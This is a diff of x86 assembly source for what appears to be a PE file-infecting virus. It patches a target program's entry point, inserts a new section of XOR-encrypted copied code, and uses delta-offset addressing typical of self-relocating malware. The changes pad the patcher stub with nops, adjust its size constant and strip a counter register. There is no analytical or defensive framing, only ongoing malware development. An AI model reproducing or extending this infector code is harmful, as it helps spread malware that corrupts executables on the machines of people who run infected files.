@@ -113,6 +113,34 @@ nop
 nop
 nop
 nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
 endPatcher:
 
 ; Jmp data
@@ -808,7 +836,7 @@ mov	[DELTA PeFileMap], eax
 ; INFOS
 PATCH_DECRYPT_SIZE	= 22
 PATCH_SIZE		= PATCH_DECRYPT_SIZE + 5
-PATCHER_SIZE		= 46
+PATCHER_SIZE		= 47
 DECRYPTER_SIZE		= 25
 
 
@@ -869,7 +897,6 @@ stosb
 mov	eax, [DELTA OldEntryPoint]
 add	eax, [DELTA BaseImage]
 stosd
-mov	ebx, 5 ; Patcher Size
 patchNewDword:
 mov	eax, 0B8h ; mov eax, imm32
 stosb
@@ -877,9 +904,8 @@ lodsd
 stosd
 mov	eax, 0ABh ; stosd
 stosb
-add	ebx, 6
 sub	ecx, 4
-cmp	ecx, 0	
+cmp	ecx, 0
 jg	patchNewDword
 
 ; INSERTING NEW SECTION - OPCODE COPY WITH ENCRYPTION
@@ -962,7 +988,7 @@ xor	eax, XorCrypt
 stosd
 
 
-; DEBUG FILE INJECTED - TODO REMOVE
+; DEBUG FILE INJECTED
 push	0
 PDELTA	DebugDone
 PDELTA	FileData.cFileName
